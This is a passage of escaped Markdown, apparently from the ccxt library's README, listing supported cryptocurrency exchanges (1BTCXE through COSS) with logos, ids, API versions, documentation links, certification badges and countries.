|\n|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-----------|----------------------------------------------------------------------|:---:|:----------------------------------------------------------------------------------:|----------------------------------------------------------------------------------------------------------------------------|\n|[![binance](https:\/\/user-images.githubusercontent.com\/1294454\/29604020-d5483cdc-87ee-11e7-94c7-d1a8d9169293.jpg)](https:\/\/www.binance.com\/?ref=10205187)                     | binance   | [Binance](https:\/\/www.binance.com\/?ref=10205187)                     | *   | [API](https:\/\/binance-docs.github.io\/apidocs\/spot\/en)                              | [![CCXT Certified](https:\/\/img.shields.io\/badge\/CCXT-certified-green.svg)](https:\/\/github.com\/ccxt\/ccxt\/wiki\/Certification) | Japan, Malta          |\n|[![bitfinex](https:\/\/user-images.githubusercontent.com\/1294454\/27766244-e328a50c-5ed2-11e7-947b-041416579bb3.jpg)](https:\/\/www.bitfinex.com\/?refcode=P61eYxFL)               | bitfinex  | [Bitfinex](https:\/\/www.bitfinex.com\/?refcode=P61eYxFL)               | 1   | [API](https:\/\/docs.bitfinex.com\/v1\/docs)                                           | [![CCXT Certified](https:\/\/img.shields.io\/badge\/CCXT-certified-green.svg)](https:\/\/github.com\/ccxt\/ccxt\/wiki\/Certification) | British Virgin Islands|\n|[![bittrex](https:\/\/user-images.githubusercontent.com\/1294454\/27766352-cf0b3c26-5ed5-11e7-82b7-f3826b7a97d8.jpg)](https:\/\/bittrex.com)                                       | bittrex   | [Bittrex](https:\/\/bittrex.com)                                       | 1.1 | [API](https:\/\/bittrex.github.io\/api\/)                                              | [![CCXT Certified](https:\/\/img.shields.io\/badge\/CCXT-certified-green.svg)](https:\/\/github.com\/ccxt\/ccxt\/wiki\/Certification) | US                    |\n|[![bytetrade](https:\/\/user-images.githubusercontent.com\/1294454\/67288762-2f04a600-f4e6-11e9-9fd6-c60641919491.jpg)](https:\/\/www.bytetrade.com)                               | bytetrade | [ByteTrade](https:\/\/www.bytetrade.com)                               | *   | [API](https:\/\/github.com\/Bytetrade\/bytetrade-official-api-docs\/wiki)               | [![CCXT Certified](https:\/\/img.shields.io\/badge\/CCXT-certified-green.svg)](https:\/\/github.com\/ccxt\/ccxt\/wiki\/Certification) | Hong Kong             |\n|[![coss](https:\/\/user-images.githubusercontent.com\/1294454\/50328158-22e53c00-0503-11e9-825c-c5cfd79bfa74.jpg)](https:\/\/www.coss.io\/c\/reg?r=OWCMHQVW2Q)                       | coss      | [COSS](https:\/\/www.coss.io\/c\/reg?r=OWCMHQVW2Q)                       | 1   | [API](https:\/\/api.coss.io\/v1\/spec)                                                 | [![CCXT Certified](https:\/\/img.shields.io\/badge\/CCXT-certified-green.svg)](https:\/\/github.com\/ccxt\/ccxt\/wiki\/Certification) | Singapore, Netherlands|\n|[![ftx](https:\/\/user-images.githubusercontent.com\/1294454\/67149189-df896480-f2b0-11e9-8816-41593e17f9ec.jpg)](https:\/\/ftx.com\/#a=1623029)                                    | ftx       | [FTX](https:\/\/ftx.com\/#a=1623029)                                    | *   | [API](https:\/\/github.com\/ftexchange\/ftx)                                           | [![CCXT Certified](https:\/\/img.shields.io\/badge\/CCXT-certified-green.svg)](https:\/\/github.com\/ccxt\/ccxt\/wiki\/Certification) | Hong Kong             |\n|[![idex](https:\/\/user-images.githubusercontent.com\/1294454\/63693236-3415e380-c81c-11e9-8600-ba1634f1407d.jpg)](https:\/\/idex.market)                                          | idex      | [IDEX](https:\/\/idex.market)                                          | *   | [API](https:\/\/docs.idex.market\/)                                                   | [![CCXT Certified](https:\/\/img.shields.io\/badge\/CCXT-certified-green.svg)](https:\/\/github.com\/ccxt\/ccxt\/wiki\/Certification) | US                    |\n|[![kraken](https:\/\/user-images.githubusercontent.com\/1294454\/27766599-22709304-5ede-11e7-9de1-9f33732e1509.jpg)](https:\/\/www.kraken.com)                                     | kraken    | [Kraken](https:\/\/www.kraken.com)                                     | 0   | [API](https:\/\/www.kraken.com\/features\/api)                                         | [![CCXT Certified](https:\/\/img.shields.io\/badge\/CCXT-certified-green.svg)](https:\/\/github.com\/ccxt\/ccxt\/wiki\/Certification) | US                    |\n|[![kucoin](https:\/\/user-images.githubusercontent.com\/1294454\/57369448-3cc3aa80-7196-11e9-883e-5ebeb35e4f57.jpg)](https:\/\/www.kucoin.com\/?rcode=E5wkqe)                       | kucoin    | [KuCoin](https:\/\/www.kucoin.com\/?rcode=E5wkqe)                       | 2   | [API](https:\/\/docs.kucoin.com)                                                     | [![CCXT Certified](https:\/\/img.shields.io\/badge\/CCXT-certified-green.svg)](https:\/\/github.com\/ccxt\/ccxt\/wiki\/Certification) | Seychelles            |\n|[![poloniex](https:\/\/user-images.githubusercontent.com\/1294454\/27766817-e9456312-5ee6-11e7-9b3c-b628ca5626a5.jpg)](https:\/\/www.poloniex.com\/?utm_source=ccxt&utm_medium=web) | poloniex  | [Poloniex](https:\/\/www.poloniex.com\/?utm_source=ccxt&utm_medium=web) | *   | [API](https:\/\/docs.poloniex.com)                                                   | [![CCXT Certified](https:\/\/img.shields.io\/badge\/CCXT-certified-green.svg)](https:\/\/github.com\/ccxt\/ccxt\/wiki\/Certification) | US                    |\n|[![upbit](https:\/\/user-images.githubusercontent.com\/1294454\/49245610-eeaabe00-f423-11e8-9cba-4b0aed794799.jpg)](https:\/\/upbit.com)                                           | upbit     | [Upbit](https:\/\/upbit.com)                                           | 1   | [API](https:\/\/docs.upbit.com\/docs\/%EC%9A%94%EC%B2%AD-%EC%88%98-%EC%A0%9C%ED%95%9C) | [![CCXT Certified](https:\/\/img.shields.io\/badge\/CCXT-certified-green.svg)](https:\/\/github.com\/ccxt\/ccxt\/wiki\/Certification) | South Korea           |\n\n## Supported Cryptocurrency Exchange Markets\n\nThe ccxt library currently supports the following 123 cryptocurrency exchange markets and trading APIs:\n\n|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;logo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;                                                                                                       | id                 | name                                                                                    | ver | doc                                                                                          | certified                                                                                                                  |\n|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------|-----------------------------------------------------------------------------------------|:---:|:--------------------------------------------------------------------------------------------:|----------------------------------------------------------------------------------------------------------------------------|\n|[![_1btcxe](https:\/\/user-images.githubusercontent.com\/1294454\/27766049-2b294408-5ecc-11e7-85cc-adaff013dc1a.jpg)](https:\/\/1btcxe.com)                                                          | _1btcxe            | [1BTCXE](https:\/\/1btcxe.com)                                                            | *   | [API](https:\/\/1btcxe.com\/api-docs.php)                                                       |                                                                                                                             | Panama                                  |\n|[![acx](https:\/\/user-images.githubusercontent.com\/1294454\/30247614-1fe61c74-9621-11e7-9e8c-f1a627afa279.jpg)](https:\/\/acx.io)                                                                  | acx                | [ACX](https:\/\/acx.io)                                                                   | 2   | [API](https:\/\/acx.io\/documents\/api_v2)                                                       |                                                                                                                             | Australia                               |\n|[![adara](https:\/\/user-images.githubusercontent.com\/1294454\/49189583-0466a780-f380-11e8-9248-57a631aad2d6.jpg)](https:\/\/adara.io)                                                              | adara              | [Adara](https:\/\/adara.io)                                                               | 1   | [API](https:\/\/api.adara.io\/v1)                                                               |                                                                                                                             | Malta                                   |\n|[![allcoin](https:\/\/user-images.githubusercontent.com\/1294454\/31561809-c316b37c-b061-11e7-8d5a-b547b4d730eb.jpg)](https:\/\/www.allcoin.com)                                                     | allcoin            | [Allcoin](https:\/\/www.allcoin.com)                                                      | 1   | [API](https:\/\/www.allcoin.com\/api_market\/market)                                             |                                                                                                                             | Canada                                  |\n|[![anxpro](https:\/\/user-images.githubusercontent.com\/1294454\/27765983-fd8595da-5ec9-11e7-82e3-adb3ab8c2612.jpg)](https:\/\/anxpro.com)                                                           | anxpro             | [ANXPro](https:\/\/anxpro.com)                                                            | *   | [API](https:\/\/anxv2.docs.apiary.io)                                                          |                                                                                                                             | Japan, Singapore, Hong Kong, New Zealand|\n|[![bcex](https:\/\/user-images.githubusercontent.com\/1294454\/43362240-21c26622-92ee-11e8-9464-5801ec526d77.jpg)](https:\/\/www.bcex.top\/register?invite_code=758978&lang=en)                       | bcex               | [BCEX](https:\/\/www.bcex.top\/register?invite_code=758978&lang=en)                        | 1   | [API](https:\/\/github.com\/BCEX-TECHNOLOGY-LIMITED\/API_Docs\/wiki\/Interface)                    |                                                                                                                             | China, Canada                           |\n|[![bequant](https:\/\/user-images.githubusercontent.com\/1294454\/55248342-a75dfe00-525a-11e9-8aa2-05e9dca943c6.jpg)](https:\/\/bequant.io)                                                          | bequant            | [Bequant](https:\/\/bequant.io)                                                           | 2   | [API](https:\/\/api.bequant.io\/)                                                               |                                                                                                                             | Malta                                   |\n|[![bibox](https:\/\/user-images.githubusercontent.com\/1294454\/34902611-2be8bf1a-f830-11e7-91a2-11b2f292e750.jpg)](https:\/\/www.bibox.com\/signPage?id=11114745&lang=en)                            | bibox              | [Bibox](https:\/\/www.bibox.com\/signPage?id=11114745&lang=en)                             | 1   | [API](https:\/\/biboxcom.github.io\/en\/)                                                        |                                                                                                                             | China, US, South Korea                  |\n|[![bigone](https:\/\/user-images.githubusercontent.com\/1294454\/69354403-1d532180-0c91-11ea-88ed-44c06cefdf87.jpg)](https:\/\/b1.run\/users\/new?code=D3LLBVFT)                                       | bigone             | [BigONE](https:\/\/b1.run\/users\/new?code=D3LLBVFT)                                        | 3   | [API](https:\/\/open.big.one\/docs\/api.html)                                                    |                                                                                                                             | China                                   |\n|[![binance](https:\/\/user-images.githubusercontent.com\/1294454\/29604020-d5483cdc-87ee-11e7-94c7-d1a8d9169293.jpg)](https:\/\/www.binance.com\/?ref=10205187)                                       | binance            | [Binance](https:\/\/www.binance.com\/?ref=10205187)                                        | *   | [API](https:\/\/binance-docs.github.io\/apidocs\/spot\/en)                                        | [![CCXT Certified](https:\/\/img.shields.io\/badge\/CCXT-certified-green.svg)](https:\/\/github.com\/ccxt\/ccxt\/wiki\/Certification) | Japan, Malta                            |\n|[![binanceje](https:\/\/user-images.githubusercontent.com\/1294454\/54874009-d526eb00-4df3-11e9-928c-ce6a2b914cd1.jpg)](https:\/\/www.binance.je\/?ref=35047921)                                      | binanceje          | [Binance Jersey](https:\/\/www.binance.je\/?ref=35047921)                                  | *   | [API](https:\/\/github.com\/binance-exchange\/binance-official-api-docs\/blob\/master\/rest-api.md) |                                                                                                                             | Jersey                                  |\n|[![binanceus](https:\/\/user-images.githubusercontent.com\/1294454\/65177307-217b7c80-da5f-11e9-876e-0b748ba0a358.jpg)](https:\/\/www.binance.us\/?ref=35005074)                                      | binanceus          | [Binance US](https:\/\/www.binance.us\/?ref=35005074)                                      | *   | [API](https:\/\/github.com\/binance-us\/binance-official-api-docs)                               |                                                                                                                             | US                                      |\n|[![bit2c](https:\/\/user-images.githubusercontent.com\/1294454\/27766119-3593220e-5ece-11e7-8b3a-5a041f6bcc3f.jpg)](https:\/\/bit2c.co.il\/Aff\/63bfed10-e359-420c-ab5a-ad368dab0baf)                  | bit2c              | [Bit2C](https:\/\/bit2c.co.il\/Aff\/63bfed10-e359-420c-ab5a-ad368dab0baf)                   | *   | [API](https:\/\/www.bit2c.co.il\/home\/api)                                                      |                                                                                                                             | Israel                                  |\n|[![bitbank](https:\/\/user-images.githubusercontent.com\/1294454\/37808081-b87f2d9c-2e59-11e8-894d-c1900b7584fe.jpg)](https:\/\/bitbank.cc\/)                                                         | bitbank            | [bitbank](https:\/\/bitbank.cc\/)                                                          | 1   | [API](https:\/\/docs.bitbank.cc\/)                                                              |                                                                                                                             | Japan                                   |\n|[![bitbay](https:\/\/user-images.githubusercontent.com\/1294454\/27766132-978a7bd8-5ece-11e7-9540-bc96d1e9bbb8.jpg)](https:\/\/auth.bitbay.net\/ref\/jHlbB4mIkdS1)                                     | bitbay             | [BitBay](https:\/\/auth.bitbay.net\/ref\/jHlbB4mIkdS1)                                      | *   | [API](https:\/\/bitbay.net\/public-api)                                                         |                                                                                                                             | Malta, EU                               |\n|[![bitfinex](https:\/\/user-images.githubusercontent.com\/1294454\/27766244-e328a50c-5ed2-11e7-947b-041416579bb3.jpg)](https:\/\/www.bitfinex.com\/?refcode=P61eYxFL)                                 | bitfinex           | [Bitfinex](https:\/\/www.bitfinex.com\/?refcode=P61eYxFL)                                  | 1   | [API](https:\/\/docs.bitfinex.com\/v1\/docs)                                                     | [![CCXT Certified](https:\/\/img.shields.io\/badge\/CCXT-certified-green.svg)](https:\/\/github.com\/ccxt\/ccxt\/wiki\/Certification) | British Virgin Islands                  |\n|[![bitfinex2](https:\/\/user-images.githubusercontent.com\/1294454\/27766244-e328a50c-5ed2-11e7-947b-041416579bb3.jpg)](https:\/\/www.bitfinex.com\/?refcode=P61eYxFL)                                | bitfinex2          | [Bitfinex](https:\/\/www.bitfinex.com\/?refcode=P61eYxFL)                                  | 2   | [API](https:\/\/docs.bitfinex.com\/v2\/docs\/)                                                    |                                                                                                                             | British Virgin Islands                  |\n|[![bitflyer](https:\/\/user-images.githubusercontent.com\/1294454\/28051642-56154182-660e-11e7-9b0d-6042d1e6edd8.jpg)](https:\/\/bitflyer.jp)                                                        | bitflyer           | [bitFlyer](https:\/\/bitflyer.jp)                                                         | 1   | [API](https:\/\/lightning.bitflyer.com\/docs?lang=en)                                           |                                                                                                                             | Japan                                   |\n|[![bitforex](https:\/\/user-images.githubusercontent.com\/1294454\/44310033-69e9e600-a3d8-11e8-873d-54d74d1bc4e4.jpg)](https:\/\/www.bitforex.com\/en\/invitationRegister?inviterId=1867438)           | bitforex           | [Bitforex](https:\/\/www.bitforex.com\/en\/invitationRegister?inviterId=1867438)            | 1   | [API](https:\/\/github.com\/bitforexapi\/API_Docs\/wiki)                                          |                                                                                                                             | China                                   |\n|[![bithumb](https:\/\/user-images.githubusercontent.com\/1294454\/30597177-ea800172-9d5e-11e7-804c-b9d4fa9b56b0.jpg)](https:\/\/www.bithumb.com)                                                     | bithumb            | [Bithumb](https:\/\/www.bithumb.com)                                                      | *   | [API](https:\/\/apidocs.bithumb.com)                                                           |                                                                                                                             | South Korea                             |\n|[![bitkk](https:\/\/user-images.githubusercontent.com\/1294454\/32859187-cd5214f0-ca5e-11e7-967d-96568e2e2bd1.jpg)](https:\/\/www.bitkk.com)                                                         | bitkk              | [bitkk](https:\/\/www.bitkk.com)                                                          | 1   | [API](https:\/\/www.bitkk.com\/i\/developer)                                                     |                                                                                                                             | China                                   |\n|[![bitlish](https:\/\/user-images.githubusercontent.com\/1294454\/27766275-dcfc6c30-5ed3-11e7-839d-00a846385d0b.jpg)](https:\/\/bitlish.com)                                                         | bitlish            | [Bitlish](https:\/\/bitlish.com)                                                          | 1   | [API](https:\/\/bitlish.com\/api)                                                               |                                                                                                                             | UK, EU, Russia                          |\n|[![bitmart](https:\/\/user-images.githubusercontent.com\/1294454\/61835713-a2662f80-ae85-11e9-9d00-6442919701fd.jpg)](http:\/\/www.bitmart.com\/?r=rQCFLh)                                            | bitmart            | [BitMart](http:\/\/www.bitmart.com\/?r=rQCFLh)                                             | 2   | [API](https:\/\/github.com\/bitmartexchange\/bitmart-official-api-docs)                          |                                                                                                                             | US, China, Hong Kong, South Korea       |\n|[![bitmax](https:\/\/user-images.githubusercontent.com\/1294454\/66820319-19710880-ef49-11e9-8fbe-16be62a11992.jpg)](https:\/\/bitmax.io\/#\/register?inviteCode=EL6BXBQM)                             | bitmax             | [BitMax](https:\/\/bitmax.io\/#\/register?inviteCode=EL6BXBQM)                              | 1   | [API](https:\/\/github.com\/bitmax-exchange\/api-doc\/blob\/master\/bitmax-api-doc-v1.2.md)         |                                                                                                                             | China                                   |\n|[![bitmex](https:\/\/user-images.githubusercontent.com\/1294454\/27766319-f653c6e6-5ed4-11e7-933d-f0bc3699ae8f.jpg)](https:\/\/www.bitmex.com\/register\/rm3C16)                                       | bitmex             | [BitMEX](https:\/\/www.bitmex.com\/register\/rm3C16)                                        | 1   | [API](https:\/\/www.bitmex.com\/app\/apiOverview)                                                |                                                                                                                             | Seychelles                              |\n|[![bitso](https:\/\/user-images.githubusercontent.com\/1294454\/27766335-715ce7aa-5ed5-11e7-88a8-173a27bb30fe.jpg)](https:\/\/bitso.com\/?ref=itej)                                                   | bitso              | [Bitso](https:\/\/bitso.com\/?ref=itej)                                                    | 3   | [API](https:\/\/bitso.com\/api_info)                                                            |                                                                                                                             | Mexico                                  |\n|[![bitstamp](https:\/\/user-images.githubusercontent.com\/1294454\/27786377-8c8ab57e-5fe9-11e7-8ea4-2b05b6bcceec.jpg)](https:\/\/www.bitstamp.net)                                                   | bitstamp           | [Bitstamp](https:\/\/www.bitstamp.net)                                                    | 2   | [API](https:\/\/www.bitstamp.net\/api)                                                          |                                                                                                                             | UK                                      |\n|[![bitstamp1](https:\/\/user-images.githubusercontent.com\/1294454\/27786377-8c8ab57e-5fe9-11e7-8ea4-2b05b6bcceec.jpg)](https:\/\/www.bitstamp.net)                                                  | bitstamp1          | [Bitstamp](https:\/\/www.bitstamp.net)                                                    | 1   | [API](https:\/\/www.bitstamp.net\/api)                                                          |                                                                                                                             | UK                                      |\n|[![bittrex](https:\/\/user-images.githubusercontent.com\/1294454\/27766352-cf0b3c26-5ed5-11e7-82b7-f3826b7a97d8.jpg)](https:\/\/bittrex.com)                                                         | bittrex            | [Bittrex](https:\/\/bittrex.com)                                                          | 1.1 | [API](https:\/\/bittrex.github.io\/api\/)                                                        | [![CCXT Certified](https:\/\/img.shields.io\/badge\/CCXT-certified-green.svg)](https:\/\/github.com\/ccxt\/ccxt\/wiki\/Certification) | US                                      |\n|[![bitz](https:\/\/user-images.githubusercontent.com\/1294454\/35862606-4f554f14-0b5d-11e8-957d-35058c504b6f.jpg)](https:\/\/u.bit-z.com\/register?invite_code=1429193)                               | bitz               | [Bit-Z](https:\/\/u.bit-z.com\/register?invite_code=1429193)                               | 2   | [API](https:\/\/apidoc.bit-z.com\/en\/)                                                          |                                                                                                                             | Hong Kong                               |\n|[![bl3p](https:\/\/user-images.githubusercontent.com\/1294454\/28501752-60c21b82-6feb-11e7-818b-055ee6d0e754.jpg)](https:\/\/bl3p.eu)                                                                | bl3p               | [BL3P](https:\/\/bl3p.eu)                                                                 | 1   | [API](https:\/\/github.com\/BitonicNL\/bl3p-api\/tree\/master\/docs)                                |                                                                                                                             | Netherlands, EU                         |\n|[![bleutrade](https:\/\/user-images.githubusercontent.com\/1294454\/30303000-b602dbe6-976d-11e7-956d-36c5049c01e7.jpg)](https:\/\/bleutrade.com)                                                     | bleutrade          | [Bleutrade](https:\/\/bleutrade.com)                                                      | 2   | [API](https:\/\/app.swaggerhub.com\/apis-docs\/bleu\/white-label\/3.0.0)                           |                                                                                                                             | Brazil                                  |\n|[![braziliex](https:\/\/user-images.githubusercontent.com\/1294454\/34703593-c4498674-f504-11e7-8d14-ff8e44fb78c1.jpg)](https:\/\/braziliex.com\/?ref=5FE61AB6F6D67DA885BC98BA27223465)               | braziliex          | [Braziliex](https:\/\/braziliex.com\/?ref=5FE61AB6F6D67DA885BC98BA27223465)                | *   | [API](https:\/\/braziliex.com\/exchange\/api.php)                                                |                                                                                                                             | Brazil                                  |\n|[![btcalpha](https:\/\/user-images.githubusercontent.com\/1294454\/42625213-dabaa5da-85cf-11e8-8f99-aa8f8f7699f0.jpg)](https:\/\/btc-alpha.com\/?r=123788)                                            | btcalpha           | [BTC-Alpha](https:\/\/btc-alpha.com\/?r=123788)                                            | 1   | [API](https:\/\/btc-alpha.github.io\/api-docs)                                                  |                                                                                                                             | US                                      |\n|[![btcbox](https:\/\/user-images.githubusercontent.com\/1294454\/31275803-4df755a8-aaa1-11e7-9abb-11ec2fad9f2d.jpg)](https:\/\/www.btcbox.co.jp\/)                                                    | btcbox             | [BtcBox](https:\/\/www.btcbox.co.jp\/)                                                     | 1   | [API](https:\/\/www.btcbox.co.jp\/help\/asm)                                                     |                                                                                                                             | Japan                                   |\n|[![btcchina](https:\/\/user-images.githubusercontent.com\/1294454\/27766368-465b3286-5ed6-11e7-9a11-0f6467e1d82b.jpg)](https:\/\/www.btcchina.com)                                                   | btcchina           | [BTCChina](https:\/\/www.btcchina.com)                                                    | 1   | [API](https:\/\/www.btcchina.com\/apidocs)                                                      |                                                                                                                             | China                                   |\n|[![btcmarkets](https:\/\/user-images.githubusercontent.com\/1294454\/29142911-0e1acfc2-7d5c-11e7-98c4-07d9532b29d7.jpg)](https:\/\/btcmarkets.net)                                                   | btcmarkets         | [BTC Markets](https:\/\/btcmarkets.net)                                                   | *   | [API](https:\/\/github.com\/BTCMarkets\/API)                                                     |                                                                                                                             | Australia                               |\n|[![btctradeim](https:\/\/user-images.githubusercontent.com\/1294454\/36770531-c2142444-1c5b-11e8-91e2-a4d90dc85fe8.jpg)](https:\/\/m.baobi.com\/invite?inv=1765b2)                                    | btctradeim         | [BtcTrade.im](https:\/\/m.baobi.com\/invite?inv=1765b2)                                    | *   | [API](https:\/\/www.btctrade.im\/help.api.html)                                                 |                                                                                                                             | Hong Kong                               |\n|[![btctradeua](https:\/\/user-images.githubusercontent.com\/1294454\/27941483-79fc7350-62d9-11e7-9f61-ac47f28fcd96.jpg)](https:\/\/btc-trade.com.ua\/registration\/22689)                              | btctradeua         | [BTC Trade UA](https:\/\/btc-trade.com.ua\/registration\/22689)                             | *   | [API](https:\/\/docs.google.com\/document\/d\/1ocYA0yMy_RXd561sfG3qEPZ80kyll36HUxvCRe5GbhE\/edit)  |                                                                                                                             | Ukraine                                 |\n|[![btcturk](https:\/\/user-images.githubusercontent.com\/1294454\/27992709-18e15646-64a3-11e7-9fa2-b0950ec7712f.jpg)](https:\/\/www.btcturk.com)                                                     | btcturk            | [BTCTurk](https:\/\/www.btcturk.com)                                                      | *   | [API](https:\/\/github.com\/BTCTrader\/broker-api-docs)                                          |                                                                                                                             | Turkey                                  |\n|[![buda](https:\/\/user-images.githubusercontent.com\/1294454\/47380619-8a029200-d706-11e8-91e0-8a391fe48de3.jpg)](https:\/\/www.buda.com)                                                           | buda               | [Buda](https:\/\/www.buda.com)                                                            | 2   | [API](https:\/\/api.buda.com)                                                                  |                                                                                                                             | Argentina, Chile, Colombia, Peru        |\n|[![bw](https:\/\/user-images.githubusercontent.com\/1294454\/69436317-31128c80-0d52-11ea-91d1-eb7bb5818812.jpg)](https:\/\/www.bw.com)                                                               | bw                 | [BW](https:\/\/www.bw.com)                                                                | 1   | [API](https:\/\/github.com\/bw-exchange\/api_docs_en\/wiki)                                       |                                                                                                                             | China                                   |\n|[![bytetrade](https:\/\/user-images.githubusercontent.com\/1294454\/67288762-2f04a600-f4e6-11e9-9fd6-c60641919491.jpg)](https:\/\/www.bytetrade.com)                                                 | bytetrade          | [ByteTrade](https:\/\/www.bytetrade.com)                                                  | *   | [API](https:\/\/github.com\/Bytetrade\/bytetrade-official-api-docs\/wiki)                         | [![CCXT Certified](https:\/\/img.shields.io\/badge\/CCXT-certified-green.svg)](https:\/\/github.com\/ccxt\/ccxt\/wiki\/Certification) | Hong Kong                               |\n|[![cex](https:\/\/user-images.githubusercontent.com\/1294454\/27766442-8ddc33b0-5ed8-11e7-8b98-f786aef0f3c9.jpg)](https:\/\/cex.io\/r\/0\/up105393824\/0\/)                                               | cex                | [CEX.IO](https:\/\/cex.io\/r\/0\/up105393824\/0\/)                                             | *   | [API](https:\/\/cex.io\/cex-api)                                                                |                                                                                                                             | UK, EU, Cyprus, Russia                  |\n|[![chilebit](https:\/\/user-images.githubusercontent.com\/1294454\/27991414-1298f0d8-647f-11e7-9c40-d56409266336.jpg)](https:\/\/chilebit.net)                                                       | chilebit           | [ChileBit](https:\/\/chilebit.net)                                                        | 1   | [API](https:\/\/blinktrade.com\/docs)                                                           |                                                                                                                             | Chile                                   |\n|[![cobinhood](https:\/\/user-images.githubusercontent.com\/1294454\/35755576-dee02e5c-0878-11e8-989f-1595d80ba47f.jpg)](https:\/\/cobinhood.com?referrerId=a9d57842-99bb-4d7c-b668-0479a15a458b)     | cobinhood          | [COBINHOOD](https:\/\/cobinhood.com?referrerId=a9d57842-99bb-4d7c-b668-0479a15a458b)      | 1   | [API](https:\/\/cobinhood.github.io\/api-public)                                                |                                                                                                                             | Taiwan                                  |\n|[![coinbase](https:\/\/user-images.githubusercontent.com\/1294454\/40811661-b6eceae2-653a-11e8-829e-10bfadb078cf.jpg)](https:\/\/www.coinbase.com\/join\/58cbe25a355148797479dbd2)                     | coinbase           | [Coinbase](https:\/\/www.coinbase.com\/join\/58cbe25a355148797479dbd2)                      | 2   | [API](https:\/\/developers.coinbase.com\/api\/v2)                                                |                                                                                                                             | US                                      |\n|[![coinbaseprime](https:\/\/user-images.githubusercontent.com\/1294454\/44539184-29f26e00-a70c-11e8-868f-e907fc236a7c.jpg)](https:\/\/prime.coinbase.com)                                            | coinbaseprime      | [Coinbase Prime](https:\/\/prime.coinbase.com)                                            | *   | [API](https:\/\/docs.prime.coinbase.com)                                                       |                                                                                                                             | US                                      |\n|[![coinbasepro](https:\/\/user-images.githubusercontent.com\/1294454\/41764625-63b7ffde-760a-11e8-996d-a6328fa9347a.jpg)](https:\/\/pro.coinbase.com\/)                                               | coinbasepro        | [Coinbase Pro](https:\/\/pro.coinbase.com\/)                                               | *   | [API](https:\/\/docs.pro.coinbase.com\/)                                                        |                                                                                                                             | US                                      |\n|[![coincheck](https:\/\/user-images.githubusercontent.com\/1294454\/27766464-3b5c3c74-5ed9-11e7-840e-31b32968e1da.jpg)](https:\/\/coincheck.com)                                                     | coincheck          | [coincheck](https:\/\/coincheck.com)                                                      | *   | [API](https:\/\/coincheck.com\/documents\/exchange\/api)                                          |                                                                                                                             | Japan, Indonesia                        |\n|[![coinegg](https:\/\/user-images.githubusercontent.com\/1294454\/36770310-adfa764e-1c5a-11e8-8e09-449daac3d2fb.jpg)](https:\/\/www.coinegg.com\/user\/register?invite=523218)                         | coinegg            | [CoinEgg](https:\/\/www.coinegg.com\/user\/register?invite=523218)                          | *   | [API](https:\/\/www.coinegg.com\/explain.api.html)                                              |                                                                                                                             | China, UK                               |\n|[![coinex](https:\/\/user-images.githubusercontent.com\/1294454\/38046312-0b450aac-32c8-11e8-99ab-bc6b136b6cc7.jpg)](https:\/\/www.coinex.com\/register?refer_code=yw5fz)                             | coinex             | [CoinEx](https:\/\/www.coinex.com\/register?refer_code=yw5fz)                              | 1   | [API](https:\/\/github.com\/coinexcom\/coinex_exchange_api\/wiki)                                 |                                                                                                                             | China                                   |\n|[![coinfalcon](https:\/\/user-images.githubusercontent.com\/1294454\/41822275-ed982188-77f5-11e8-92bb-496bcd14ca52.jpg)](https:\/\/coinfalcon.com\/?ref=CFJSVGTUPASB)                                 | coinfalcon         | [CoinFalcon](https:\/\/coinfalcon.com\/?ref=CFJSVGTUPASB)                                  | 1   | [API](https:\/\/docs.coinfalcon.com)                                                           |                                                                                                                             | UK                                      |\n|[![coinfloor](https:\/\/user-images.githubusercontent.com\/1294454\/28246081-623fc164-6a1c-11e7-913f-bac0d5576c90.jpg)](https:\/\/www.coinfloor.co.uk)                                               | coinfloor          | [coinfloor](https:\/\/www.coinfloor.co.uk)                                                | *   | [API](https:\/\/github.com\/coinfloor\/api)                                                      |                                                                                                                             | UK                                      |\n|[![coingi](https:\/\/user-images.githubusercontent.com\/1294454\/28619707-5c9232a8-7212-11e7-86d6-98fe5d15cc6e.jpg)](https:\/\/www.coingi.com\/?r=XTPPMC)                                             | coingi             | [Coingi](https:\/\/www.coingi.com\/?r=XTPPMC)                                              | *   | [API](https:\/\/coingi.docs.apiary.io)                                                         |                                                                                                                             | Panama, Bulgaria, China, US             |\n|[![coinmarketcap](https:\/\/user-images.githubusercontent.com\/1294454\/28244244-9be6312a-69ed-11e7-99c1-7c1797275265.jpg)](https:\/\/coinmarketcap.com)                                             | coinmarketcap      | [CoinMarketCap](https:\/\/coinmarketcap.com)                                              | 1   | [API](https:\/\/coinmarketcap.com\/api)                                                         |                                                                                                                             | US                                      |\n|[![coinmate](https:\/\/user-images.githubusercontent.com\/1294454\/27811229-c1efb510-606c-11e7-9a36-84ba2ce412d8.jpg)](https:\/\/coinmate.io?referral=YTFkM1RsOWFObVpmY1ZjMGREQmpTRnBsWjJJNVp3PT0)   | coinmate           | [CoinMate](https:\/\/coinmate.io?referral=YTFkM1RsOWFObVpmY1ZjMGREQmpTRnBsWjJJNVp3PT0)    | *   | [API](https:\/\/coinmate.docs.apiary.io)                                                       |                                                                                                                             | UK, Czech Republic, EU                  |\n|[![coinone](https:\/\/user-images.githubusercontent.com\/1294454\/38003300-adc12fba-323f-11e8-8525-725f53c4a659.jpg)](https:\/\/coinone.co.kr)                                                       | coinone            | [CoinOne](https:\/\/coinone.co.kr)                                                        | 2   | [API](https:\/\/doc.coinone.co.kr)                                                             |                                                                                                                             | South Korea                             |\n|[![coinspot](https:\/\/user-images.githubusercontent.com\/1294454\/28208429-3cacdf9a-6896-11e7-854e-4c79a772a30f.jpg)](https:\/\/www.coinspot.com.au\/register?code=PJURCU)                           | coinspot           | [CoinSpot](https:\/\/www.coinspot.com.au\/register?code=PJURCU)                            | *   | [API](https:\/\/www.coinspot.com.au\/api)                                                       |                                                                                                                             | Australia                               |\n|[![coolcoin](https:\/\/user-images.githubusercontent.com\/1294454\/36770529-be7b1a04-1c5b-11e8-9600-d11f1996b539.jpg)](https:\/\/www.coolcoin.com\/user\/register?invite_code=bhaega)                  | coolcoin           | [CoolCoin](https:\/\/www.coolcoin.com\/user\/register?invite_code=bhaega)                   | *   | [API](https:\/\/www.coolcoin.com\/help.api.html)                                                |                                                                                                                             | Hong Kong                               |\n|[![coss](https:\/\/user-images.githubusercontent.com\/1294454\/50328158-22e53c00-0503-11e9-825c-c5cfd79bfa74.jpg)](https:\/\/www.coss.io\/c\/reg?r=OWCMHQVW2Q)                                         | coss               | 